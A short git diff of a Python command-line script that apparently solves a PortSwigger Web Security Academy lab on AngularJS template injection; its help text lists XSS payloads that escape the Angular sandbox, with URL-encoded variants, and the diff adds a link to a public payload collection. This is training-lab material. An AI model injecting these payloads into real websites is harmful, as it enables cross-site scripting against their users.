@@ -20,6 +20,8 @@ Another solution: {{[].pop.constructor&#40'alert\u00281\u0029'&#41&#40&#41}}
 We need to URL-encode the symbols & and # which become: %26 and %23 respectively
 
 So the payload becomes: {{[].pop.constructor%26%2340'alert\u00281\u0029'%26%2341%26%2340%26%2341}}
+
+Solutions can be found here: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md
 """, usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
 parser.add_argument('-u', '--url', help='URL, Example: https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net', required=True)
 parser.add_argument('-c', '--command', help='Command to run, Example: {{constructor.constructor(\'alert("XSS")\')()}}, {{[].pop.constructor&#40\'alert\u00281\u0029\'&#41&#40&#41}}', required=True)
